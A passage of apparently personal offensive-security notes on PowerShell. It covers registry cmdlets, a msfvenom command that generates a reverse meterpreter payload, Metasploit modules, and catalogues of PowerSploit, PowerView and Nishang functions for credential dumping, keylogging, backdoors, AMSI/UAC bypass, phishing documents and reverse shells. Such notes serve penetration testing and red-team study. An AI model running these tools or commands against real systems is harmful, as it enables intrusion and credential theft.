<li>Shell.Applcation.1   </li>
</ul>
</li>
</ul>
<h2 id="windows-registry">Windows Registry<a class="headerlink" href="#windows-registry" title="Permanent link">&para;</a></h2>
<p><div class="highlight"><pre><span></span><code>Get-Item &#39;HKLM:\SOFTWARE\Microsoft\Windows NT\Current Version&#39;
Get-ChildItem &#39;HKLM:\SOFTWARE\Microsoft\Windows NT\Current Version&#39; -Recurse
</code></pre></div>
- Use registry as filesystem:
    <div class="highlight"><pre><span></span><code>Get-Provider -PSProvider Registry
</code></pre></div>
    <div class="highlight"><pre><span></span><code>Set-Location Registry::
&gt; ls
&gt; cd HKLM
&gt; ls

New-PSDrive -name RegistryDrive -PSProvider Registry -Root Registry::
&gt; dir

Get-PSDrive

New-Item -Path HKCU:\Test\New
New-ItemProperty -Path HKCU:\Test\New -Name Reg2 -PropertyType String -Value 2
Rename-Item HKCU:\Test -NewName HKCU:TestNew
Rename-ItemProperty HKCU:\Test\New -Name Reg2 -NewName Reg3
Set-ItemProperty -Path HKCU:\Test\New -Name Reg2 -Value 3
</code></pre></div></p>
<ul>
<li>Client Side Attacks<ul>
<li>Out-Word</li>
<li>Out-Excel</li>
<li>Out-CHM</li>
<li>Out-Shortcut</li>
<li>Out-HTA</li>
<li>Out-Java</li>
</ul>
</li>
<li>Encoding<ul>
<li><code>Invole-Encode -DataToEncode example.ps1 -OutCommand</code><ul>
<li><code>Out-CHM -Payload "-e &lt;encodedValue&gt;"</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="metasploit">Metasploit<a class="headerlink" href="#metasploit" title="Permanent link">&para;</a></h2>
<ul>
<li>Using Powershell with Metasploit: <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit</a>
    <div class="highlight"><pre><span></span><code>msfvenom meterpreter
./msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;IP&gt; -f psh-reflection

cmd/windows/reverse_powershell
</code></pre></div></li>
<li>Useful modules:<ul>
<li>exploit/windows/smb/psexec_psh<ul>
<li>Payload is encoded</li>
</ul>
</li>
<li>exploit/windows/local/powershell_cmd_upgrade<ul>
<li>Upgrade native to Powershell</li>
</ul>
</li>
<li>post/windows/manage/powershell/exec_powershell</li>
<li>exploit/multi/script/web_delivery</li>
</ul>
</li>
</ul>
<h2 id="modules">Modules<a class="headerlink" href="#modules" title="Permanent link">&para;</a></h2>
<ul>
<li>Posh-SecMod<ul>
<li><a href="https://github.com/darkoperator/Posh-SecMod">https://github.com/darkoperator/Posh-SecMod</a> - PowerShell Module with Security cmdlets for security work</li>
<li>Discovery: Perform network discovery.</li>
<li>Parse: Parsers for Nmap, DNSRecon and other type of output files from security tools.</li>
<li>PostExploitation: Functions to help in performing post exploitation tasks.</li>
<li>Registry: Collection of functions for manipulating the registry in remote hosts using WMI.</li>
<li>Utilities: General purpose functions.</li>
<li>Audit: Functions that may be usful when performing audit of systems.</li>
<li>Database: Functions that are useful when interacting with databases.</li>
</ul>
</li>
<li>PowerSploit<ul>
<li><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a> - A PowerShell Post-Exploitation Framework</li>
<li>CodeExecution<ul>
<li><code>Invoke-DllInjection</code>Injects a Dll into the process ID of your choosing.</li>
<li><code>Invoke-ReflectivePEInjection</code>Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.</li>
<li><code>Invoke-Shellcode</code>Injects shellcode into the process ID of your choosing or within PowerShell locally</li>
<li>.<code>Invoke-WmiCommand</code>Executes a PowerShell ScriptBlock on a target computer and returns its formatted output using WMI as a C2 channel.</li>
</ul>
</li>
<li>ScriptModification<ul>
<li><code>Out-EncodedCommand</code>Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script.</li>
<li><code>Out-CompressedDll</code>Compresses, Base-64 encodes, and outputs generated code to load a managed dll in memory.</li>
<li><code>Out-EncryptedScript</code>Encrypts text files/scripts.</li>
<li><code>Remove-Comments</code>Strips comments and extra whitespace from a script.</li>
</ul>
</li>
<li>Persistence<ul>
<li><code>New-UserPersistenceOption</code>Configure user-level persistence options for the Add-Persistence function.</li>
<li><code>New-ElevatedPersistenceOption</code>Configure elevated persistence options for the Add-Persistence function.</li>
<li><code>Add-Persistence</code>Add persistence capabilities to a script.<code>Install-SSP</code>Installs a security support provider (SSP) dll.</li>
<li><code>Get-SecurityPackages</code>Enumerates all loaded security packages (SSPs).</li>
</ul>
</li>
<li>AntivirusBypass<ul>
<li><code>Find-AVSignature</code>Locates single Byte AV signatures utilizing the same method as DSplit from "class101".</li>
</ul>
</li>
<li>Exfiltration<ul>
<li><code>Invoke-TokenManipulation</code>Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread.<ul>
<li><code>Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"</code></li>
<li><code>GetProcess lass | Invoke-TokenManipulation -ImperrsonateUser</code></li>
</ul>
</li>
<li><code>Invoke-CredentialInjection</code>Create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).</li>
<li><code>Invoke-NinjaCopy</code>Copies a file from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.<ul>
<li>Copy from NTDS.dit, SYSTEM, SAM Hive</li>
</ul>
</li>
<li><code>Invoke-Mimikatz</code>Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any functionality provided with Mimikatz.<ul>
<li><code>Invoke-Mimikatz -DumpCreds</code></li>
<li><code>Invoke-Mimikatz -DumpCerts</code></li>
</ul>
</li>
<li><code>Get-Keystrokes</code>Logs keys pressed, time and the active window.</li>
<li><code>Get-GPPPassword</code>Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.<ul>
<li>KB2928120</li>
</ul>
</li>
<li><code>Get-GPPAutologon</code>Retrieves autologon username and password from registry.xml if pushed through Group Policy Preferences.</li>
<li><code>Get-TimedScreenshot</code>A function that takes screenshots at a regular interval and saves them to a folder.</li>
<li><code>New-VolumeShadowCopy</code>Creates a new volume shadow copy.</li>
<li><code>Get-VolumeShadowCopy</code>Lists the device paths of all local volume shadow copies.</li>
<li><code>Mount-VolumeShadowCopy</code>Mounts a volume shadow copy.</li>
<li><code>Remove-VolumeShadowCopy</code>Deletes a volume shadow copy.</li>
<li><code>Get-VaultCredential</code>Displays Windows vault credential objects including cleartext web credentials.</li>
<li><code>Out-Minidump</code>Generates a full-memory minidump of a process.</li>
<li><code>Get-MicrophoneAudio</code>Records audio from system microphone and saves to disk</li>
</ul>
</li>
<li>Mayhem<ul>
<li><code>Set-MasterBootRecord</code>Proof of concept code that overwrites the master boot record with the message of your choice.</li>
<li><code>Set-CriticalProcess</code>Causes your machine to blue screen upon exiting PowerShell.</li>
</ul>
</li>
<li>Privesc<ul>
<li><code>PowerUp</code>Clearing house of common privilege escalation checks, along with some weaponization vectors.<ul>
<li>Service Enumeration:<ul>
<li><code>Get-ServiceUnquoted</code> - returns services with unquoted paths that also have a space in the name</li>
<li><code>Get-ModifiableServiceFile</code> - returns services where the current user can write to the service binary path or its config</li>
<li><code>Get-ModifiableService</code> - returns services the current user can modify</li>
<li><code>Get-ServiceDetail</code> - returns detailed information about a specified service</li>
</ul>
</li>
<li>Service Abuse:<ul>
<li><code>Invoke-ServiceAbuse</code> - modifies a vulnerable service to create a local admin or execute a custom command</li>
<li><code>Write-ServiceBinary</code> - writes out a patched C# service binary that adds a local admin or executes a custom command</li>
<li><code>Install-ServiceBinary</code> - replaces a service binary with one that adds a local admin or executes a custom command</li>
<li><code>Restore-ServiceBinary</code> - restores a replaced service binary with the original executable</li>
</ul>
</li>
<li>DLL Hijacking:<ul>
<li><code>Find-ProcessDLLHijack</code> - finds potential DLL hijacking opportunities for currently running processes</li>
<li><code>Find-PathDLLHijack</code> - finds service %PATH% DLL hijacking opportunities</li>
<li><code>Write-HijackDll</code> - writes out a hijackable DLL</li>
</ul>
</li>
<li>Registry Checks:<ul>
<li><code>Get-RegistryAlwaysInstallElevated</code> - checks if the AlwaysInstallElevated registry key is set</li>
<li><code>Get-RegistryAutoLogon</code> - checks for Autologon credentials in the registry</li>
<li><code>Get-ModifiableRegistryAutoRun</code> - checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns</li>
</ul>
</li>
<li>Miscellaneous Checks:<ul>
<li><code>Get-ModifiableScheduledTaskFile</code> - find schtasks with modifiable target files</li>
<li><code>Get-UnattendedInstallFile</code> - finds remaining unattended installation files</li>
<li><code>Get-Webconfig</code> - checks for any encrypted web.config strings</li>
<li><code>Get-ApplicationHost</code> - checks for encrypted application pool and virtual directory passwords</li>
<li><code>Get-SiteListPassword</code> - retrieves the plaintext passwords for any found McAfee's SiteList.xml files</li>
<li><code>Get-CachedGPPPassword</code> - checks for passwords in cached Group Policy Preferences files</li>
</ul>
</li>
<li>Other Helpers/Meta-Functions:<ul>
<li><code>Get-ModifiablePath</code> - tokenizes an input string and returns the files in it the current user can modify</li>
<li><code>Get-CurrentUserTokenGroupSid</code> - returns all SIDs that the current user is a part of, whether they are disabled or not</li>
<li><code>Add-ServiceDacl</code> - adds a Dacl field to a service object returned by Get-Service</li>
<li><code>Set-ServiceBinPath</code> - sets the binary path for a service to a specified value through Win32 API methods</li>
<li><code>Test-ServiceDaclPermission</code> - tests one or more passed services or service names against a given permission set</li>
<li><code>Write-UserAddMSI</code> - write out a MSI installer that prompts for a user to be added</li>
<li><code>Invoke-AllChecks</code> - runs all current escalation checks and returns a report</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Recon<ul>
<li><code>Invoke-Portscan</code>Does a simple port scan using regular sockets, based (pretty) loosely on nmap.</li>
<li><code>Get-HttpStatus</code>Returns the HTTP Status Codes and full URL for specified paths when provided with a dictionary file.</li>
<li><code>Invoke-ReverseDnsLookup</code>Scans an IP address range for DNS PTR records.</li>
<li><code>PowerView</code>PowerView is series of functions that performs network and Windows domain enumeration and exploitation.<ul>
<li>Misc<ul>
<li><code>Export-PowerViewCSV</code>- thread-safe CSV append</li>
<li><code>Set-MacAttribute</code> - Sets MAC attributes for a file based on another file or input (from Powersploit)</li>
<li><code>Copy-ClonedFile</code> - copies a local file to a remote location, matching MAC properties</li>
<li><code>Get-IPAddress</code> - resolves a hostname to an IP</li>
<li><code>Test-Server</code> - tests connectivity to a specified server</li>
<li><code>Convert-NameToSid</code> - converts a given user/group name to a security identifier (SID)</li>
<li><code>Convert-SidToName</code> - converts a security identifier (SID) to a group/user name</li>
<li><code>Convert-NT4toCanonical</code> - converts a user/group NT4 name (i.e. dev/john) to canonical format</li>
<li><code>Get-Proxy</code> - enumerates local proxy settings</li>
<li><code>Get-PathAcl</code> - get the ACLs for a local/remote file path with optional group recursion</li>
<li><code>Get-UserProperty</code> - returns all properties specified for users, or a set of user:prop names</li>
<li><code>Get-ComputerProperty</code> - returns all properties specified for computers, or a set of computer:prop names</li>
<li><code>Find-InterestingFile</code> - search a local or remote path for files with specific terms in the name</li>
<li><code>Invoke-CheckLocalAdminAccess</code> - check if the current user context has local administrator access to a specified host</li>
<li><code>Get-DomainSearcher</code> - builds a proper ADSI searcher object for a given domain</li>
<li><code>Get-ObjectAcl</code> - returns the ACLs associated with a specific active directory object</li>
<li><code>Add-ObjectAcl</code> - adds an ACL to a specified active directory object</li>
<li><code>Get-LastLoggedOn</code> - return the last logged on user for a target host</li>
<li><code>Get-CachedRDPConnection</code> -  queries all saved RDP connection entries on a target host</li>
<li><code>Invoke-ACLScanner</code> - enumerate -1000+ modifable ACLs on a specified domain</li>
<li><code>Get-GUIDMap</code> - returns a hash table of current GUIDs -&gt; display names</li>
<li><code>Get-DomainSID</code> - return the SID for the specified domain</li>
<li><code>Invoke-ThreadedFunction</code> - helper that wraps threaded invocation for other </li>
</ul>
</li>
<li>net * Functions:<ul>
<li><code>Get-NetDomain</code> - gets the name of the current user's domain</li>
<li><code>Get-NetForest</code> - gets the forest associated with the current user's domain</li>
<li><code>Get-NetForestDomain</code> - gets all domains for the current forest</li>
<li><code>Get-NetDomainController</code> - gets the domain controllers for the current computer's domain</li>
<li><code>Get-NetUser</code> - returns all user objects, or the user specified (wildcard specifiable)</li>
<li><code>Add-NetUser</code> - adds a local or domain user</li>
<li><code>Get-NetComputer</code> - gets a list of all current servers in the domain</li>
<li><code>Get-NetPrinter</code> - gets an array of all current computers objects in a domain</li>
<li><code>Get-NetOU</code> - gets data for domain organization units</li>
<li><code>Get-NetSite</code> - gets current sites in a domain</li>
<li><code>Get-NetSubnet</code> - gets registered subnets for a domain</li>
<li><code>Get-NetGroup</code> - gets a list of all current groups in a domain</li>
<li><code>Get-NetGroupMember</code> - gets a list of all current users in a specified domain group</li>
<li><code>Get-NetLocalGroup</code> - gets the members of a localgroup on a remote host or hosts</li>
<li><code>Add-NetGroupUser</code> - adds a local or domain user to a local or domain group</li>
<li><code>Get-NetFileServer</code> - get a list of file servers used by current domain users</li>
<li><code>Get-DFSshare</code> - gets a list of all distribute file system shares on a domain</li>
<li><code>Get-NetShare</code> - gets share information for a specified server</li>
<li><code>Get-NetLoggedon</code> - gets users actively logged onto a specified server</li>
<li><code>Get-NetSession</code> - gets active sessions on a specified server</li>
<li><code>Get-NetRDPSession</code> - gets active RDP sessions for a specified server (like qwinsta)</li>
<li><code>Get-NetProcess</code> - gets the remote processes and owners on a remote server</li>
<li><code>Get-UserEvent</code> - returns logon or TGT events from the event log for a specified host</li>
<li><code>Get-ADObject</code> - takes a domain SID and returns the user, group, or computer object associated with it</li>
<li><code>Set-ADObject</code> - takes a SID, name, or SamAccountName to query for a specified domain object, and then sets a specified 'PropertyName' to a specified 'PropertyValue'</li>
</ul>
</li>
<li>GPO functions:<ul>
<li><code>Get-GptTmpl</code> - parses a GptTmpl.inf to a custom object</li>
<li><code>Get-NetGPO</code> - gets all current GPOs for a given domain</li>
<li><code>Get-NetGPOGroup</code> - gets all GPOs in a domain that set "Restricted Groups" on on target machines</li>
<li><code>Find-GPOLocation</code> - takes a user/group and makes machines they have effective rights over through GPO enumeration and correlation</li>
<li><code>Find-GPOComputerAdmin</code> - takes a computer and determines who has admin rights over it through GPO enumeration</li>
<li><code>Get-DomainPolicy</code> - returns the default domain or DC policy</li>
</ul>
</li>
<li>User-Hunting Functions:<ul>
<li><code>Invoke-UserHunter</code> - finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines</li>
<li><code>Invoke-StealthUserHunter</code> - finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users</li>
<li><code>Invoke-ProcessHunter</code> - hunts for processes with a specific name or owned by a specific user on domain machines</li>
<li><code>Invoke-UserEventHunter</code> - hunts for user logon events in domain controller event logs</li>
</ul>
</li>
<li>Domain Trust Functions:<ul>
<li><code>Get-NetDomainTrust</code> - gets all trusts for the current user's domain</li>
<li><code>Get-NetForestTrust</code> - gets all trusts for the forest associated with the current user's domain</li>
<li><code>Find-ForeignUser</code> - enumerates users who are in groups outside of their principal domain</li>
<li><code>Find-ForeignGroup</code> - enumerates all the members of a domain's groups and finds users that are outside of the queried domain</li>
<li><code>Invoke-MapDomainTrust</code> - try to build a relational mapping of all domain trusts</li>
</ul>
</li>
<li>MetaFunctions:<ul>
<li><code>Invoke-ShareFinder</code> - finds (non-standard) shares on hosts in the local domain</li>
<li><code>Invoke-FileFinder</code> - finds potentially sensitive files on hosts in the local domain</li>
<li><code>Find-LocalAdminAccess</code> - finds machines on the domain that the current user has local admin access to</li>
<li><code>Find-ManagedSecurityGroups</code> - searches for active directory security groups which are managed and identify users who have write access to those groups (i.e. the ability to add or remove members)</li>
<li><code>Find-UserField</code> - searches a user field for a particular term</li>
<li><code>Find-ComputerField</code> - searches a computer field for a particular term</li>
<li><code>Get-ExploitableSystem</code> - finds systems likely vulnerable to common exploits</li>
<li><code>Invoke-EnumerateLocalAdmin</code> - enumerates members of the local Administrators groups across all machines in the domain</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Nishang <ul>
<li><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> -  framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming</li>
<li>ActiveDirectory<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1">Set-DCShadowPermissions</a>Modify AD objects to provide minimal permissions required for DCShadow.</li>
</ul>
</li>
<li>Antak - the Webshell<ul>
<li><a href="https://github.com/samratashok/nishang/tree/master/Antak-WebShell">Antak</a>Execute PowerShell scripts in memory, run commands, and download and upload files using this webshell.</li>
</ul>
</li>
<li>Backdoors<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/HTTP-Backdoor.ps1">HTTP-Backdoor</a>A backdoor which can receive instructions from third party websites and execute PowerShell scripts in memory.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/DNS_TXT_Pwnage.ps1">DNS_TXT_Pwnage</a>A backdoor which can receive commands and PowerShell scripts from DNS TXT queries, execute them on a target, and be remotely controlled using the queries.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Execute-OnTime.ps1">Execute-OnTime</a>A backdoor which can execute PowerShell scripts at a given time on a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Gupt-Backdoor.ps1">Gupt-Backdoor</a>A backdoor which can receive commands and scripts from a WLAN SSID without connecting to it.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Add-ScrnSaveBackdoor.ps1">Add-ScrnSaveBackdoor</a>A backdoor which can use Windows screen saver for remote command and script execution.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1">Invoke-ADSBackdoor</a>A backdoor which can use alternate data streams and Windows Registry to achieve persistence.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Add-RegBackdoor.ps1">Add-RegBackdoor</a>A backdoor which uses well known Debugger trick to execute payload with Sticky keys and Utilman (Windows key + U).</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1">Set-RemoteWMI</a>Modify permissions of DCOM and WMI namespaces to allow access to a non-admin user.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1">Set-RemotePSRemoting</a>Modify permissions of PowerShell remoting to allow access to a non-admin user.</li>
</ul>
</li>
<li>Bypass<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1">Invoke-AmsiBypass</a>Implementation of publicly known methods to bypass/avoid AMSI.</li>
</ul>
</li>
<li>Client<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">Out-CHM</a>Create infected CHM files which can execute PowerShell commands and scripts.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Word.ps1">Out-Word</a>Create Word files and infect existing ones to run PowerShell commands and scripts.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Excel.ps1">Out-Excel</a>Create Excel files and infect existing ones to run PowerShell commands and scripts.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-HTA.ps1">Out-HTA</a>Create a HTA file which can be deployed on a web server and used in phishing campaigns.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Java.ps1">Out-Java</a>Create signed JAR files which can be used with applets for script and command execution.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Shortcut.ps1">Out-Shortcut</a>Create shortcut files capable of executing PowerShell commands and scripts.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-WebQuery.ps1">Out-WebQuery</a>Create IQY files for phishing credentials and SMB hashes.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-JS.ps1">Out-JS</a>Create JS files capable of executing PowerShell commands and scripts.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-SCT.ps1">Out-SCT</a>Create SCT files capable of executing PowerShell commands and scripts.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-SCF.ps1">Out-SCF</a>Create a SCF file which can be used for capturing NTLM hash challenges.</li>
</ul>
</li>
<li>Escalation<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Escalation/Enable-DuplicateToken.ps1">Enable-DuplicateToken</a>When SYSTEM privileges are required.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Escalation/Remove-Update.ps1">Remove-Update</a>Introduce vulnerabilities by removing patches.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Escalation/Invoke-PsUACme.ps1">Invoke-PsUACme</a>Bypass UAC.</li>
</ul>
</li>
<li>Execution<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Execution/Download-Execute-PS.ps1">Download-Execute-PS</a>Download and execute a PowerShell script in memory.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Execution/Download_Execute.ps1">Download_Execute</a>Download an executable in text format, convert it to an executable, and execute.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Execution/Execute-Command-MSSQL.ps1">Execute-Command-MSSQL</a>Run PowerShell commands, native commands, or SQL commands on a MSSQL Server with sufficient privileges.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Execution/Execute-DNSTXT-Code.ps1">Execute-DNSTXT-Code</a>Execute shellcode in memory using DNS TXT queries.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Execution/Out-RundllCommand.ps1">Out-RundllCommand</a>Execute PowerShell commands and scripts or a reverse PowerShell session using rundll32.exe.</li>
</ul>
</li>
<li>Gather<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Check-VM.ps1">Check-VM</a>Check for a virtual machine.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1">Copy-VSS</a>Copy the SAM file using Volume Shadow Copy Service.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Credentials.ps1">Invoke-CredentialsPhish</a>Trick a user into giving credentials in plain text.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/FireBuster.ps1">FireBuster</a> </li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/FireListener.ps1">FireListener</a>A pair of scripts for egress testing</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1">Get-Information</a>Get juicy information from a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-LSASecret.ps1">Get-LSASecret</a>Get LSA Secret from a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1">Get-PassHashes</a>Get password hashes from a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WLAN-Keys.ps1">Get-WLAN-Keys</a>Get WLAN keys in plain text from a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Keylogger.ps1">Keylogger</a>Log keystrokes from a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1">Invoke-MimikatzWdigestDowngrade</a>Dump user passwords in plain on Windows 8.1 and Server 2012</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHints.ps1">Get-PassHints</a>Get password hints of Windows users from a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Show-TargetScreen.ps1">Show-TargetScreen</a>Connect back and Stream target screen using MJPEG.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a>Load mimikatz in memory. Updated and with some customisation.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikittenz.ps1">Invoke-Mimikittenz</a>Extract juicy information from target process (like browsers) memory using regex.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-SSIDExfil.ps1">Invoke-SSIDExfil</a>Exfiltrate information like user credentials, using WLAN SSID.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-SessionGopher.ps1">Invoke-SessionGopher</a>Identify admin jump-boxes and/or computers used to access Unix machines.<ul>
<li>Extract information from Putty and RDP (ppk, rdp, stdid)</li>
<li>Decrypt passwords for WinSCP from registry </li>
<li>"Admin" required for remote operations  </li>
<li>"-ExcludeDc" to prevent detection</li>
</ul>
</li>
</ul>
</li>
<li>MITM<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/MITM/Invoke-Interceptor.ps1">Invoke-Interceptor</a>A local HTTPS proxy for MITM attacks.</li>
</ul>
</li>
<li>Pivot<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Pivot/Create-MultipleSessions.ps1">Create-MultipleSessions</a>Check credentials on multiple computers and create PSSessions.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Pivot/Run-EXEonRemote.ps1">Run-EXEonRemote</a> Copy and execute an executable on multiple machines.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Pivot/Invoke-NetworkRelay.ps1">Invoke-NetworkRelay</a> Create network relays between computers.</li>
</ul>
</li>
<li>Prasadhak<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Prasadhak/Prasadhak.ps1">Prasadhak</a>Check running hashes of running process against the VirusTotal database.</li>
</ul>
</li>
<li>Scan<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Scan/Brute-Force.ps1">Brute-Force</a>Brute force FTP, Active Directory, MSSQL, and Sharepoint.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Scan/Port-Scan.ps1">Port-Scan</a>A handy port scanner.</li>
<li>Powerpreter</li>
<li><a href="https://github.com/samratashok/nishang/tree/master/powerpreter">Powerpreter</a>All the functionality of nishang in a single script module.</li>
</ul>
</li>
<li>Shells<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PsGcat.ps1">Invoke-PsGcat</a>Send commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PsGcatAgent.ps1">Invoke-PsGcatAgent</a>Execute commands and scripts sent by Invoke-PsGcat.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Invoke-PowerShellTcp</a>An interactive PowerShell reverse connect or bind shell</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">Invoke-PowerShellTcpOneLine</a>Stripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLineBind.ps1">Invoke-PowerShellTcpOneLineBind</a>Bind version of Invoke-PowerShellTcpOneLine.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1">Invoke-PowerShellUdp</a>An interactive PowerShell reverse connect or bind shell over UDP</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdpOneLine.ps1">Invoke-PowerShellUdpOneLine</a>Stripped down version of Invoke-PowerShellUdp.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PoshRatHttps.ps1">Invoke-PoshRatHttps</a>Reverse interactive PowerShell over HTTPS.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PoshRatHttp.ps1">Invoke-PoshRatHttp</a>Reverse interactive PowerShell over HTTP.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Remove-PoshRat.ps1">Remove-PoshRat</a>Clean the system after using Invoke-PoshRatHttps</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellWmi.ps1">Invoke-PowerShellWmi</a>Interactive PowerShell using WMI.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1">Invoke-PowerShellIcmp</a>An interactive PowerShell reverse shell over ICMP.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-JSRatRundll.ps1">Invoke-JSRatRundll</a>An interactive PowerShell reverse shell over HTTP using rundll32.exe.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-JSRatRegsvr.ps1">Invoke-JSRatRegsvr</a>An interactive PowerShell reverse shell over HTTP using regsvr32.exe.</li>
</ul>
</li>
<li>Utility<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Add-Exfiltration.ps1">Add-Exfiltration</a>Add data exfiltration capability to Gmail, Pastebin, a web server, and DNS to any script.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Add-Persistence.ps1">Add-Persistence</a>Add reboot persistence capability to a script.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Remove-Persistence.ps1">Remove-Persistence</a>Remote persistence added by the Add-Persistence script.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Do-Exfiltration.ps1">Do-Exfiltration</a>Pipe (|) this to any script to exfiltrate the output.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Download.ps1">Download</a>Transfer a file to the target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Parse_Keys.ps1">Parse_Keys</a>Parse keys logged by the keylogger.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Decode.ps1">Invoke-Encode</a>Encode and compress a script or string.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Decode.ps1">Invoke-Decode</a>Decode and decompress a script or string from Invoke-Encode.</li>
